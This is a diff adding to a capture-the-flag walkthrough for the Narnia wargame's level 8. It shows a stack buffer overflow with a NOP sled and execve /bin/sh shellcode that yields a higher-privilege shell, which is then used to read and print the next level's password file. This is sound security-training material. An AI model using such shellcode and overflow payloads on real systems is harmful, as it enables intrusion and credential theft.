@@ -625,3 +625,23 @@ Now we add 4 bytes:
 narnia8@narnia:~$ /narnia/narnia8 $(python -c'print "A"*20+"\xf1\xd8\xff\xff"') |xxd
 0000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
 0000010: 4141 4141 f1d8 ffff 020a                 AAAA......
+
+Now we try with the actualy payload size:
+
+narnia8@narnia:~$ /narnia/narnia8 $(python -c'print "A"*20+"\xb1\xd8\xff\xff"+"B"*64')     
+AAAAAAAAAAAAAAAAAAAA����BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Segmentation fault
+
+Nice we're getting somewhere!
+Now I put the payload in there, changed eip to point to bok instead of b because that was causing issues
+
+narnia8@narnia:~$ /narnia/narnia8 $(python -c'print "A"*20+"\xb1\xd8\xff\xff"+"B"*12+"\xd9\xd8\xff\xff"+"\x90"*(64-25-16)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')     
+AAAAAAAAAAAAAAAAAAAA����BBBBBBBBBBBB���������������������������1�Ph//shh/bin��PS���°
+                                                                                    
+$ whoami
+narnia9
+$ cat /etc/narnia_pass/narnia9
+eiL5fealae
+$ exit
+
+SWEEEEEEET!!!!!!!! 
